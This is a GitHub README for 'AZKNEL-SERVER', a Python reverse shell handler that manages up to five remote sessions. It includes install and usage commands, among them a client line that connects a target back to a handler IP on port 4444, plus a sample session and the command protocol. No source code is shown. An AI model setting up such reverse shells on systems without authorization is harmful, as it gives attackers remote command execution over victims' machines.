<p align="center">
  <img src="./Server-removebg-preview.png" alt="AZKNEL-SERVER logo" width="250" style="max-width:100%;height:auto;" />
</p>

<h1 align="center">
  <strong>Multi-Session Reverse Shell AZKNEL-SERVER</strong>
</h1>
<p align="center">
A cross-platform Python-based reverse shell system that enables centralized management of multiple remote systems through an interactive console interface.
</p>

## Description

Multi-Session Reverse Shell Handler is a remote administration tool that allows system administrators and security professionals to manage multiple remote connections simultaneously from a single centralized interface. The system consists of a cross-platform client that connects back to a multi-threaded handler capable of managing up to 5 concurrent sessions.

## Features

* **Multi-session Management** - Handle up to 5 concurrent remote connections
* **Cross-platform Compatibility** - Works on both Windows and Linux systems
* **Interactive Session Switching** - Seamlessly switch between different remote systems
* **Persistent Directory Navigation** - Maintain working directory state across commands
* **Real-time Session Monitoring** - View connection status and activity timestamps
* **Command Timeout Management** - Configurable timeouts for long-running commands
* **Structured Output Protocol** - Clean, parseable command output format
* **Automatic Cleanup** - Handles disconnections and resource management
* **Colored Interface** - Visual feedback with ANSI color support

## Installation

Clone the repository:
```bash
git clone https://github.com/AzK-os-dev/AZKNEL-SERVER.git
cd multi-session-handler
```

No additional dependencies required - uses Python standard library only.

**Requirements:**
* Python 3.6 or higher
* Network connectivity between systems

## Quick Start

1. **Start the handler** on your control machine:
```bash
python3 handler.py --port 4444
```

2. **Connect clients** from remote systems:
```bash
python3 main.py --host <HANDLER_IP> --port 4444
```

3. **Manage sessions** through the interactive console:
```bash
MultiHandler> sessions          # List all sessions
MultiHandler> session a1b2c3d4  # Switch to specific session
MultiHandler> ls -la            # Execute commands on active session
```

## Usage

### Handler Commands

| Command | Description |
|---------|-------------|
| `sessions` | Display all active sessions |
| `session <id>` | Switch to specific session |
| `kill <id>` | Terminate specific session |
| `killall` | Terminate all sessions |
| `help` | Show available commands |
| `exit` | Exit handler |

### Client Options

```bash
python3 main.py --host <HOST> --port <PORT> [OPTIONS]

Options:
  -H, --host          Handler IP address (required)
  -p, --port          Handler port (required)  
  -t, --timeout       Command timeout in seconds (default: 600)
  --no-color          Disable ANSI colors
  --long-prompt       Show full directory path
```

### Handler Options

```bash
python3 handler.py --port <PORT> [OPTIONS]

Options:
  -p, --port          Listen port (required)
  -m, --max-sessions  Maximum concurrent sessions (default: 5)
```

## Example Session

```bash
$ python3 handler.py --port 4444
[+] Listening on port 4444 (max 5 sessions)

[+] New session: a1b2c3d4 from 192.168.1.50:12345
[*] Info: Connected - Running on Windows 10

[+] New session: e5f6g7h8 from 10.0.0.100:54321
[*] Info: Connected - Running on Linux Ubuntu 20.04

MultiHandler(a1b2c3d4)> sessions

=== Active Sessions ===
ID         Address              Connected  Last Activity  Info
---------------------------------------------------------------
a1b2c3d4   192.168.1.50:12345  2m         30s            Windows 10 *
e5f6g7h8   10.0.0.100:54321    1m         45s            Linux Ubuntu 20.04

MultiHandler(a1b2c3d4)> dir
=== CMD: dir
=== EXIT CODE: 0
--- STDOUT ---
Directory of C:\Users\admin
...

MultiHandler(a1b2c3d4)> session e5f6g7h8
[+] Switched to session: e5f6g7h8

MultiHandler(e5f6g7h8)> ls -la
=== CMD: ls -la  
=== EXIT CODE: 0
--- STDOUT ---
drwxr-xr-x 25 user user 4096 Sep 14 10:30 .
...
```

## Protocol

The system uses a delimiter-based protocol for structured communication:

**Command Format:**
```
<command>\n
```

**Response Format:**
```
=== CMD: <command>
=== EXIT CODE: <return_code>
--- STDOUT ---
<stdout_content>
--- STDERR ---
<stderr_content>
<<<END_OF_OUTPUT>>>
```

## Cross-Platform Support

### Windows
* Automatic handling of internal CMD commands (`dir`, `type`, `echo`)
* Path normalization with backslashes
* Windows-specific system commands (`ipconfig`, `tasklist`, `systeminfo`)

### Linux
* Standard shell command execution
* POSIX path handling
* Unix-specific commands (`ps`, `netstat`, `uname`)

## Security Notice

This tool is intended for legitimate system administration and authorized security testing purposes only. Users must:

* Only use on systems they own or have explicit written permission to test
* Comply with all applicable local, state, and federal laws
* Implement appropriate security measures in production environments
* Consider using encrypted channels for sensitive communications

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-feature`)
3. Commit your changes (`git commit -am 'Add new feature'`)
4. Push to the branch (`git push origin feature/new-feature`)
5. Create a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Troubleshooting

### Common Issues

**Connection Refused:**
* Verify handler is running and listening on correct port
* Check firewall rules on both systems
* Ensure network connectivity between systems

**Session Not Responding:**
* Check network stability
* Verify command timeout settings
* Use `sessions` command to check connection status

**Platform-Specific Commands Failing:**
* Verify command availability on target system
* Check user permissions and privileges
* Review system PATH configuration

## Changelog

### v1.0.2
* Initial release
* Multi-session management
* Cross-platform client support
* Interactive handler console
* Structured communication protocol
